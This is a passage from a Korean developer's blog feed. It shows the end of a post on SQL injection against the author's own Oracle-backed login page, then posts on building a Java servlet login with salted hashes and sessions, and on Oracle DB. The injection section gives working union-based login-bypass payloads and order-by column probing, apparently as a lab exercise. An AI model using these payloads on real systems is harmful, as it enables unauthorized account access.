    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>
    <p>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1'</code><br />
<img src="https://user-images.githubusercontent.com/31990118/233049659-a8d081d7-b534-4236-917d-9fa5306b7205.png" alt="Pasted image 20230419145543" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233049710-435711d1-158a-4f42-849a-ace70d6b1dcc.png" alt="Pasted image 20230419145554" /></p>
  </li>
  <li>standard_hash(‘user2’,’SHA512’) 로 나오는 결과와 table 에 저장된 hash 로 암호화 된 패스워드는 타입이 다르다.</li>
  <li>따라서 <strong>cast 함수</strong>를 이용하여 타입을 <strong>char(128)</strong> 로 변경하였다.</li>
</ul>

<p><br /><br /></p>

<h4 id="5-식별과-인증을-따로-할-때-id-두번-확인하기-">5. 식별과 인증을 따로 할 때(+ id 두번 확인하기 )</h4>

<blockquote>
  <p>로그인방법</p>
  <ol>
    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='아이디' and id='아이디'</code></li>
    <li>여기서 id를 두번 확인한 것을 알 수 있다.</li>
    <li>입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.</li>
    <li>일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br /><code class="language-plaintext highlighter-rouge">select * from members  where id='db에서 불러온 id정보';</code></li>
  </ol>
</blockquote>

<blockquote>
  <p>로그인 코드<br />
<script src="https://gist.github.com/MinGyu2/4838aebdc75359591b92074aff22d9b9.js"></script></p>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br />
<img src="https://user-images.githubusercontent.com/31990118/233050196-c0143052-3671-4b80-b093-26faa1a48362.png" alt="Pasted image 20230419150308" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233050247-58e103c1-83b5-4b53-bde1-bfff07bae2f4.png" alt="Pasted image 20230419150324" /></p>
</blockquote>

<p><br /></p>
<blockquote>
  <p>정확한 컬럼 수 찾기</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/233050601-910ace99-8195-40c5-a231-ef871db2e4ab.png" alt="Pasted image 20230419145849" /><br /><img src="https://user-images.githubusercontent.com/31990118/233050662-6455b018-b493-4f44-94fa-21555d6111c5.png" alt="Pasted image 20230419150003" /></li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 3 -- </code> 로그인 실패</li>
    <li>즉 컬럼의 수는 2개 라는것을 알 수 있다.</li>
  </ul>
</blockquote>

<p><br /></p>

<blockquote>
  <p>공격방법</p>
</blockquote>

<ul>
  <li><strong>union + 주석 사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','a' from dual -- </code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">a</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','a' from dual -- ' and id='x' union select 'user2','a' from dual -- '</code><br /><img src="https://user-images.githubusercontent.com/31990118/233051049-a26dfe1e-a888-412b-a552-54f56d8b4f06.png" alt="Pasted image 20230419150030" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233051097-c07becb0-6e56-458a-b33d-1401cea13e36.png" alt="Pasted image 20230419150041" /></li>
</ul>

<p><br /></p>

<blockquote>
  <p>특징</p>
  <ul>
    <li>id를 한번확인 하는 방법보다 2번 확인을 하면 공격자가 인증 쿼리 예측하기 힘들다.</li>
    <li><code class="language-plaintext highlighter-rouge">where</code> 문을 추가할 수 없다.<br />id에 다음 쿼리를 입력하여도 로그인이 안된다.<br /> <code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual where '1'='1</code></li>
  </ul>
</blockquote>

<p><br /><br /></p>
<h3 id="단방향-해시-함수">단방향 해시 함수</h3>
<hr />
<ul>
  <li>임이의 길이를 갖는 데이터를 고정된 길이의 데이터로 변환시켜주는 함수이다.</li>
  <li>위변조 여부를 판별하거나, 무결성을 검증하는데 사용된다.</li>
  <li>비밀번호를 서버에 안전하게 저장하기 위해 사용한다.</li>
  <li>MD5, SHA1, SHA256, SHA512 등이 있다.</li>
</ul>

<h3 id="sql--차이">SQL  차이</h3>
<hr />

<table>
  <thead>
    <tr>
      <th> </th>
      <th>mysql</th>
      <th>oracle db</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>한줄 주석</td>
      <td>#, –</td>
      <td>–</td>
    </tr>
    <tr>
      <td>부분 주석</td>
      <td>/**/</td>
      <td>/**/</td>
    </tr>
    <tr>
      <td>SHA512</td>
      <td>SHA2(‘A’,512)</td>
      <td>standard_hash(‘A’,’SHA512’ )</td>
    </tr>
    <tr>
      <td>더미 테이블</td>
      <td>select ‘a’, ‘b’</td>
      <td>select ‘a’,’b’ from dual</td>
    </tr>
  </tbody>
</table>

<p><br /><br /></p>

<h3 id="oracle-sql-연산자-우선순위">Oracle SQL 연산자 우선순위</h3>
<hr />

<table>
  <thead>
    <tr>
      <th>연산자</th>
      <th>설명</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>산술연산자</td>
      <td>** * , /, +, - **</td>
    </tr>
    <tr>
      <td>연결연산자</td>
      <td>||</td>
    </tr>
    <tr>
      <td>비교연산자</td>
      <td>=, &gt; , &lt; , &gt;= , &lt;= , &lt;&gt; , != , ^=</td>
    </tr>
    <tr>
      <td>논리연사자</td>
      <td>BETWEEN, NOT, AND, OR</td>
    </tr>
    <tr>
      <td>SQL 연산자</td>
      <td>LIKE, NOT LIKE, IN, EXISTS</td>
    </tr>
    <tr>
      <td>집합 연산자</td>
      <td>UNION ALL, UNION, INTERSECT, MINUS</td>
    </tr>
  </tbody>
</table>

<table>
  <thead>
    <tr>
      <th>순서</th>
      <th>연산자</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>괄호</td>
    </tr>
    <tr>
      <td>2</td>
      <td>* , /</td>
    </tr>
    <tr>
      <td>3</td>
      <td>+ , -</td>
    </tr>
    <tr>
      <td>4</td>
      <td>= , &lt;&gt; , &lt; , &gt; , &lt;= , &gt;=</td>
    </tr>
    <tr>
      <td>5</td>
      <td>IS (IS NULL, IS NOT NULL, IS EMPTY, IS NOT EMPTY)</td>
    </tr>
    <tr>
      <td>6</td>
      <td>BETWEEN</td>
    </tr>
    <tr>
      <td>7</td>
      <td>NOT</td>
    </tr>
    <tr>
      <td>8</td>
      <td>AND</td>
    </tr>
    <tr>
      <td>9</td>
      <td>OR</td>
    </tr>
  </tbody>
</table>

<h3 id="참고-사이트">참고 사이트</h3>
<hr />
<ul>
  <li><a href="https://graypastel.tistory.com/entry/ORACLE%EC%9D%98-%EC%97%B0%EC%82%B0%EC%9E%90-%EC%9A%B0%EC%84%A0%EC%88%9C%EC%9C%84">ORACLE의 연산자 우선순위 (tistory.com)</a></li>
  <li><a href="https://m.blog.naver.com/michael_cho77/221570607776">오라클 - 11. 오라클의 연산자우선순위 : 네이버 블로그 (naver.com)</a></li>
  <li><a href="https://docs.oracle.com/cd/E49933_01/server.770/es_eql/src/ceql_expr_precedence_rules.html">Operator precedence rules (oracle.com)</a></li>
  <li><a href="https://bamtory29.tistory.com/entry/MySQL-%EC%A3%BC%EC%84%9D">MySQL 주석 (tistory.com)</a></li>
  <li><a href="https://upbitcare.com/academy/education/blockchain/52">해시 함수는 무엇인가?</a></li>
  <li><a href="https://gent.tistory.com/189">오라클 NVL, NVL2 함수 사용방법 (null, 공백, 치환) (tistory.com)</a></li>
  <li><a href="https://learn.microsoft.com/ko-kr/sql/t-sql/data-types/data-type-conversion-database-engine?view=sql-server-ver16">데이터 형식 변환(데이터베이스 엔진) - SQL Server</a></li>
  <li><a href="https://hyejin.tistory.com/157">oracle 비교 함수 (DECODE(), LEAST(), GREATEST(), NVL(), WIDTH_BUCKET() )</a></li>
  <li><a href="https://stackoverflow.com/questions/2568469/storing-sha-512-hashes-in-mysql">php - Storing SHA-512 Hashes in MySQL - Stack Overflow</a></li>
  <li><a href="https://blog.jiniworld.me/93">MySQL Function 암호화 알고리즘(AES, MD5, SHA1, SHA2) (jiniworld.me)</a></li>
  <li><a href="https://atotw.tistory.com/24">Oracle STANDARD_HASH 설명 : 오라클 함수 (tistory.com)</a></li>
  <li><a href="https://blog.jiniworld.me/93">MySQL Function암호화 알고리즘(AES, MD5, SHA1, SHA2) (jiniworld.me)</a></li>
  <li><a href="https://imlena94.tistory.com/entry/SQL-Injection-%EA%B8%B0%EC%B4%88-MSORACLEMY-SQL-%EC%8B%9C%EA%B0%84%EC%A7%80%EC%97%B0-%EC%A3%BC%EC%84%9D-%EB%93%B1">SQL Injection 기초 - MS/ORACLE/MY SQL , 시간지연, 주석 등 (tistory.com)</a></li>
  <li><a href="https://jhnyang.tistory.com/470">SQL 정렬하기 order by 쿼리 사용법 1, 2 desc 의미 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SQL" /><category term="Oracle DB" /><category term="SQL Injection" /><category term="Java" /><summary type="html"><![CDATA[SQL Injection 이란? sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다. 웹 해킹 기술중 하나이다.]]></summary></entry><entry><title type="html">웹서버 만들기 7</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7/" rel="alternate" type="text/html" title="웹서버 만들기 7" /><published>2023-04-14T00:00:00+09:00</published><updated>2023-04-15T00:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7/"><![CDATA[<ul>
  <li>웹 서버 만들기 (1) ~ (6) 과정을 통해 웹서버와 DB서버 구현을 완료하였다.</li>
  <li>웹 서버에서 db에 저장된 데이터를 가져오는 방법도 알아보았다.</li>
</ul>

<h3 id="로그인-구현">로그인 구현</h3>
<hr />
<h4 id="로그인-인증-구조">로그인 인증 구조</h4>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /><br /></p>

<p><br /><br /></p>

<h4 id="유저정보를-저장-하기-위한-db-특징">유저정보를 저장 하기 위한 DB 특징</h4>
<ul>
  <li>
    <p>유저의 정보를 저장하기 위해서 <code class="language-plaintext highlighter-rouge">오라클DB</code> 에서 <code class="language-plaintext highlighter-rouge">USERS</code> 테이블을 만들어 주었다.</p>

    <table>
      <thead>
        <tr>
          <th>컬럼명</th>
          <th>데이터 타입</th>
          <th>조건</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>sid</td>
          <td>NUMBER(20)</td>
          <td>PRIMARY KEY</td>
        </tr>
        <tr>
          <td>username</td>
          <td>NVARCHAR2(32)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>email</td>
          <td>NVARCHAR2(100)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>salt</td>
          <td>VARCHAR2(30)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>password</td>
          <td>VARCHAR2(150)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>gen_time</td>
          <td>NUMBER(20)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>modifi_time</td>
          <td>NUMBER(20)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>algorithm</td>
          <td>VARCHAR2(32)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>authority</td>
          <td>CHAR(1)</td>
          <td>‘0’ 또는 ‘1’ 만 올수 있다.</td>
        </tr>
      </tbody>
    </table>

    <script src="https://gist.github.com/MinGyu2/201dcfdfea3de5ae750045ffedffadab.js"></script>
  </li>
  <li>일단 로그인을 위한 루트계정을 만들어 주었다.</li>
  <li>패스워드를 바로 <code class="language-plaintext highlighter-rouge">USERS</code> 테이블에 저장하는 것이아닌 <strong>해시</strong>계산한 값이 저장된다.<br />즉 패스워드 부분에는 <code class="language-plaintext highlighter-rouge">HASH(SALT + 유저비번)</code> 값이 저장된다.</li>
  <li><code class="language-plaintext highlighter-rouge">gen_time</code> 생성시각을 나타낸다.</li>
  <li><code class="language-plaintext highlighter-rouge">modifi_time</code> 수정시각을 나타낸다.</li>
  <li><code class="language-plaintext highlighter-rouge">algorithm</code> 은 어떤 해시함수를 사용하였는지 표시해 준다.(ex- SHA512 등… )</li>
  <li><code class="language-plaintext highlighter-rouge">authority</code> 는 유저가 관리자 권한을 가지는지 나타낸다.</li>
</ul>

<p><br /><br /></p>

<h4 id="db-를-관리하기-위한-클래스">DB 를 관리하기 위한 클래스</h4>
<ul>
  <li>UsersDAO 를 통해 데이터베이스와 연결하고 저장되어있는 유저정보를 불러올 수 있다.</li>
  <li>DB 서버에 있는 정보를 보다 쉽게 읽어올 수 있다.<br /><script src="https://gist.github.com/MinGyu2/7eba85df3c0d5e2f9d1a76ff2682e726.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">USERS</code> 테이블에서 읽어온 유저정보는 User 클래스에 저장하여 보다 쉽게 데이터를 읽을 수 있게 하였다.<br /><script src="https://gist.github.com/MinGyu2/025aa74454ea85396923fb446b403f7f.js"></script></li>
</ul>

<p><br /><br /></p>

<h4 id="로그인-페이지-접속">로그인 페이지 접속</h4>
<ol>
  <li>로그인을 하기 위한 url은 <code class="language-plaintext highlighter-rouge">http://주소/sign_in_page</code> 로 설정 하였다.</li>
  <li><code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/web.xml</code> 의 파일에서 <code class="language-plaintext highlighter-rouge">/sign_in_page</code> uri 가 어떤 클래스로 이어져야 설정하였다.<br /><script src="https://gist.github.com/MinGyu2/ace2c5b71179095cfefcc7e3253d7504.js"></script>즉 <code class="language-plaintext highlighter-rouge">/sign_in_page</code> uri로 요청이 들어오면 <code class="language-plaintext highlighter-rouge">com.mingyu2.login.Login</code> 클래스로 요청을 전달받을 수 있다.</li>
  <li>아이디와 패스워드 입력을 받기 위한 페이지를 만들어준다. <code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/sign_in_page/sing_in_page.jsp</code> 를 만들어 주었다. 그리고 이 페이지를 <code class="language-plaintext highlighter-rouge">http://주소/sign_in_page</code> 로 접속 하였을 때 보여줄 것이다.<br /><script src="https://gist.github.com/MinGyu2/44c33efb670bae35a1877a99f17a2c6c.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">web.xml</code> 에서 설정한 것 처럼 <code class="language-plaintext highlighter-rouge">Login</code> 클래스에서 클라이언트의 요청을 받는다.<br />만약 클라이언트 요청에서 받은 session id 값이 존재하는 것이면 로그인 페이지에서 바로 메인페이지로 넘어간다.<br />session id 값이 존재 안한다면 <code class="language-plaintext highlighter-rouge">sing_in_page.jsp</code> 페이지를 클라이언트에게 보여준다.<br /><script src="https://gist.github.com/MinGyu2/1e30a18c7cee7f902a809e464219fdd3.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">/sign_in_page</code> uri 로 요청이 들어오면 <code class="language-plaintext highlighter-rouge">/WEB-INF/sign_in_page/sign_in_page.jsp</code> 으로 포워드되게 하였다.<br /><img src="https://user-images.githubusercontent.com/31990118/231966307-6e9a496d-7bd9-4810-bba3-f092cac3caca.png" alt="Pasted image 20230414021004" /></li>
  <li>즉 첫 로그인이거나 세션이 만료된 상태에서 <code class="language-plaintext highlighter-rouge">http://주소/sign_in_page</code> url 로 접속하면 로그인 페이지를 보여준다.</li>
  <li>아이디와 비번을 입력하고 <code class="language-plaintext highlighter-rouge">sign in</code> 버튼을 눌러주면 <code class="language-plaintext highlighter-rouge">POST</code> 방식으로 아이디와 비밀번호를 <code class="language-plaintext highlighter-rouge">http://주소/sign_in_page/authentication</code> 로 전송한다.</li>
</ol>

<p><br /><br /></p>

<h4 id="로그인-인증">로그인 인증</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/sign_in_page/authentication</code></li>
</ul>

<ol>
  <li>먼저 세션 키가 존재하는지 확인하자. 존재하면 바로 메인페이지로 이동한다.</li>
  <li>post를 통해 요청이 들어오면 먼저 아이디와 비밀번호를 확인한다.</li>
  <li><code class="language-plaintext highlighter-rouge">LoginAuthentication</code>클래스의 인스턴스를 만들어준다. 인증 클래스의 <code class="language-plaintext highlighter-rouge">userAuthenticatoin</code> 함수에 유저 이름과 패스워드를 전송해준다.</li>
  <li>인증이 성공하면 <code class="language-plaintext highlighter-rouge">User</code> 정보를 얻을 수 있다. 하지만 인증에 실패하면 <code class="language-plaintext highlighter-rouge">null</code> 값을 받게된다.</li>
  <li>즉 null 값을 받아 로그인에 실패하면 <code class="language-plaintext highlighter-rouge">/sign_in_page</code> 다시 로그인 페이지로 리다이렉트 요청을 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">User</code> 정보를 받으면 로그인에 성공했다는 것이다.  따라서 <code class="language-plaintext highlighter-rouge">User</code> 오브젝트를 세션에 저장하여 준다. 세션 정보는 session id를 통해 가져올 수 있다.</li>
  <li>확인해 보니 session id는 자동으로 쿠키에 저장 된다.</li>
  <li>로그인에 성공하고 session id 도 생성되었다. 마지막으로 메인 페이지로 리다이렉션 해준다.<br /></li>
</ol>

<script src="https://gist.github.com/MinGyu2/6a43536366c80a7b07529ade2c3fbf9e.js"></script>

<p><br /><br /></p>

<h4 id="비밀번호-인증-과정loginauthentication-클래스">비밀번호 인증 과정(<code class="language-plaintext highlighter-rouge">LoginAuthentication</code> 클래스)</h4>
<ol>
  <li><code class="language-plaintext highlighter-rouge">Users</code> 테이블에 존재하는 유저인지 확인한다.</li>
  <li>존재하는 아이디면 salt 와 암호 알고리즘 유형을 가지고 온다.</li>
  <li>salt 와 입력받은 password 를 합치고 알고리즘 유형에 따라 HASH 암호화를 진행한다.</li>
  <li>이렇게 <strong>새로 만들어진 해시 암호문</strong>과 <strong>db에 저장된 해시 암호문</strong>을 비교한다.</li>
  <li>암호문들이 서로 동일하면 로그인에 성공하여 <strong>User</strong> 정보를 리턴해 준다.<br /></li>
</ol>

<script src="https://gist.github.com/MinGyu2/4ed99fbf300a5d7d8356f63efa7abd65.js"></script>

<p><br /><br /><br /></p>

<h3 id="main-페이지">Main 페이지</h3>
<hr />
<ul>
  <li>로그인에 성공하거나 <code class="language-plaintext highlighter-rouge">session id</code> 가 만료되기 전에 들어갈 수 있는 메인 화면이다.</li>
  <li>현재 로그인 된 유저 정보를 확인할 수 있다.</li>
</ul>

<h4 id="메인페이지-접속">메인페이지 접속</h4>
<ol>
  <li><code class="language-plaintext highlighter-rouge">http://주소/main_page</code> 주소를 통해 메인 페이지에 접속을 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/web.xml</code> 안에 <code class="language-plaintext highlighter-rouge">/main_page</code> uri 요청이 왔을 때 연결해줘야 하는 클래스를 적어주었다.<br /><script src="https://gist.github.com/MinGyu2/a1ce521401bcd401eda9dbfc61a59c2a.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">MainPage</code> 클래스에서 <code class="language-plaintext highlighter-rouge">/main_page</code> uri 요청을 처리해 준다.<br /><script src="https://gist.github.com/MinGyu2/9ea7553e8b77f47e458607acaec9cd85.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">main_page</code> 로 요청이 들어오게 되면 먼저 session id가 존재하는지 확인한다.</li>
  <li>만약 session id가 존재하지 않는다면 로그인페이지로 리다이렉션 해준다. (<code class="language-plaintext highlighter-rouge">sign_in_page</code>)</li>
  <li>로그인에 성공한다면 관리자 권한을 가진 유저인지 확인을 한다. 관리자 권한을 가진 유저라면 <code class="language-plaintext highlighter-rouge">/main_page_root.jsp</code> 로 포워딩하고, 아니면 <code class="language-plaintext highlighter-rouge">/main_page.jsp</code> 페이지로 포워딩한다.<br /><img src="https://user-images.githubusercontent.com/31990118/231967785-38c5df57-d340-4a28-abe4-43fe9803b026.png" alt="happyhacking" /></li>
</ol>

<p><br /><br /></p>

<h4 id="jsp-메인-페이지">jsp 메인 페이지</h4>
<ul>
  <li>여기서 <code class="language-plaintext highlighter-rouge">main_page_root.jsp</code> 나 <code class="language-plaintext highlighter-rouge">main_page.page</code> 구조는 동일하다.</li>
  <li>메인페이지(<code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/sign_in_page/main_page.jsp</code>)</li>
  <li>메인페이지(<code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/sign_in_page/main_page_root.jsp</code>)<br /></li>
</ul>

<script src="https://gist.github.com/MinGyu2/28ecd1c7ac7ad9ef0ba296df8025341b.js"></script>
<p><br /><img src="https://user-images.githubusercontent.com/31990118/231967785-38c5df57-d340-4a28-abe4-43fe9803b026.png" alt="happyhacking" /></p>

<p><br /><br /><br /></p>

<h3 id="로그아웃-기능">로그아웃 기능</h3>
<hr />
<ul>
  <li>로그아웃을 하면 기존에 사용하던 <code class="language-plaintext highlighter-rouge">session id</code> 값을 지워준다.</li>
  <li>로그인 상태서만 로그아웃 버튼을 누를 수 있다.</li>
  <li>로그아웃 버튼을 누루면 <code class="language-plaintext highlighter-rouge">/user-logout</code> uri 로 로그아웃 요청을 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">web.xml</code> 을 살펴보면 <code class="language-plaintext highlighter-rouge">/user-logout</code> uri로 요청이 들어왔을 때  <code class="language-plaintext highlighter-rouge">com.mingyu2.login.Logout</code> 클래스로 연결해야하는 것을 볼 수 있다<br /><script src="https://gist.github.com/MinGyu2/b5501ea8b16941e7fb2759feffd4f143.js"></script></li>
  <li>로그아웃 동작 방식 및 코드<br /><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog66Gc6re47JWE7JuDIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiBzZXNzaW9uIGlkIOyCreygnFxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOuhnOq3uOyduCDtjpjsnbTsp4Dso7zshowg66as64uk7J2066CJ7Yq4IOydkeuLtVxu7IKs7Jqp7J6QKOu4jOudvOyasOyggCkgLT4-IOyEnOuyhCA6IOuhnOq3uOyduCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCjruIzrnbzsmrDsoIApIDog66Gc6re47J24IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /><br /><script src="https://gist.github.com/MinGyu2/9b052bd4504a2334ec5af46d8dc68ddf.js"></script></li>
</ul>

<p><br /><br /></p>

<h3 id="url-와-uri-차이">URL 와 URI 차이</h3>
<hr />
<h4 id="url">URL</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">http://localhost/login_page/authentication</code> : 프로토콜 유형을 포함한 완전한 사이트 경로를 말한다.</li>
</ul>

<h4 id="uri">URI</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/login_page/authentication</code> : 주소 다음의 경로를 의미한다.</li>
</ul>

<p><br /><br /></p>

<h3 id="oracle-db-와-mysql">Oracle DB 와 MYSQL</h3>
<hr />
<ul>
  <li>서로 타입이 서로 달라 테이블을 만들때 힘들었다.</li>
  <li><a href="https://blog.naver.com/PostView.naver?blogId=seek316&amp;logNo=222108639805&amp;parentCategoryNo=&amp;categoryNo=67&amp;viewDate=&amp;isShowPopularPosts=false&amp;from=postView">MYSQL 데이터 타입 종류</a></li>
  <li><a href="https://codedragon.tistory.com/6159">오라클에 Boolean형 자료형 저장하기</a></li>
  <li><a href="https://wjheo.tistory.com/entry/%EC%98%A4%EB%9D%BC%ED%81%B4-EXISTS-%ED%99%9C%EC%9A%A9-%EC%98%88%EC%A0%9C">오라클 EXISTS 활용 예제</a></li>
  <li><a href="https://goddaehee.tistory.com/92">Oracle Dual 테이블이란?</a></li>
  <li><a href="https://string.tistory.com/29">Oracle과 MSSQL 데이터 타입 비교</a></li>
</ul>

<h3 id="참고-사이트">참고 사이트</h3>
<hr />
<ul>
  <li><a href="https://needjarvis.tistory.com/681">사이트에서 쿠키(Cookie) 확인하기 (tistory.com)</a></li>
  <li><a href="https://velog.io/@leesomyoung/DB-%EB%B9%84%EB%B0%80%EB%B2%88%ED%98%B8%EB%A5%BC-%EC%95%94%ED%98%B8%ED%99%94%ED%95%98%EC%97%AC-%EC%95%88%EC%A0%84%ED%95%98%EA%B2%8C-%EC%A0%80%EC%9E%A5%ED%95%98%EA%B8%B0">DB 비밀번호를 암호화하여 안전하게 저장하기 (velog.io)</a></li>
  <li><a href="https://initialcommit.com/blog/how-to-send-data-from-servlet-to-jsp">How to send data from Java Servlet to JSP (initialcommit.com)</a></li>
  <li><a href="https://rastalion.me/%ED%9A%8C%EC%9B%90-%EA%B0%80%EC%9E%85-%EB%B0%8F-%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%9D%84-%EC%9C%84%ED%95%9C-%ED%85%8C%EC%9D%B4%EB%B8%94-%EC%84%A4%EA%B3%84/">회원 가입 및 로그인을 위한 테이블 설계 - RastaLion’s IT Blog</a></li>
  <li><a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=robinnw&amp;logNo=220000301263">JSP &amp; Servlet :: 서블릿 오라클DB연동</a></li>
  <li><a href="https://linuxism.ustd.ip.or.kr/428">회원 정보 테이블 설계 시 고려 사항 (ip.or.kr)</a></li>
  <li><a href="https://gofnrk.tistory.com/79">자바 비밀번호 암호화 (SHA256,SHA512) + Salt (tistory.com)</a></li>
  <li><a href="https://kdhyo98.tistory.com/48">Java Random보단 SecureRandom 를 사용하자. </a></li>
  <li><a href="https://docs.oracle.com/en/java/javase/11/docs/specs/security/standard-names.html#securerandom-number-generation-algorithms">Java Security Standard Algorithm Names (oracle.com)</a></li>
  <li><a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=ding-dong&amp;logNo=221360965771">java Base64 인코딩 : 네이버 블로그 (naver.com)</a></li>
  <li><a href="https://chlee21.tistory.com/148">Java Servlet session이란? :: choice blog (tistory.com)</a></li>
  <li><a href="https://hajoung56.tistory.com/59">varchar와 nvarchar의 차이 (tistory.com)</a></li>
  <li><a href="https://blog.naver.com/PostView.nhn?blogId=kinsoo007&amp;logNo=221328795448">setAttribute(),getAttribute(),sendRedirect(),getRequestDispatcher()</a></li>
  <li><a href="https://galid1.tistory.com/502">Web - cookie 와 session 분석 (servlet 예제) (tistory.com)</a></li>
  <li><a href="https://stackoverflow.com/questions/11047548/getting-cookie-in-servlet">java - Getting cookie in servlet - Stack Overflow</a></li>
  <li><a href="https://velog.io/@hyun6ik/Servlet-Http-Session">Servlet Http Session (velog.io)</a></li>
  <li><a href="https://record-than-remember.tistory.com/entry/%EB%A1%9C%EA%B7%B8%EC%9D%B8-%E2%86%92-%EB%A1%9C%EA%B7%B8%EC%95%84%EC%9B%83-%EB%B2%84%ED%8A%BC">로그인,로그아웃 Session &amp; 로그인 버튼 → 로그아웃 버튼 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="로그인" /><category term="로그아웃" /><category term="HASH" /><category term="Oracle DB" /><summary type="html"><![CDATA[웹 서버 만들기 (1) ~ (6) 과정을 통해 웹서버와 DB서버 구현을 완료하였다. 웹 서버에서 db에 저장된 데이터를 가져오는 방법도 알아보았다.]]></summary></entry><entry><title type="html">오라클DB</title><link href="http://localhost:4000/%EC%98%A4%EB%9D%BC%ED%81%B4DB/" rel="alternate" type="text/html" title="오라클DB" /><published>2023-04-10T00:00:00+09:00</published><updated>2023-04-10T22:06:00+09:00</updated><id>http://localhost:4000/%EC%98%A4%EB%9D%BC%ED%81%B4DB</id><content type="html" xml:base="http://localhost:4000/%EC%98%A4%EB%9D%BC%ED%81%B4DB/"><![CDATA[<h3 id="db">DB</h3>
<hr />
<ul>
  <li>여러 사람에 의해 공유되어 사용될 목적으로 통합하여 관리되는 데이터의 집합이다.</li>
  <li>자료를 구조화 하여 저장함으로써 자료 검색과 갱신의 효율을 높일 수 있다.</li>
</ul>

<h3 id="oracle-db">Oracle DB</h3>
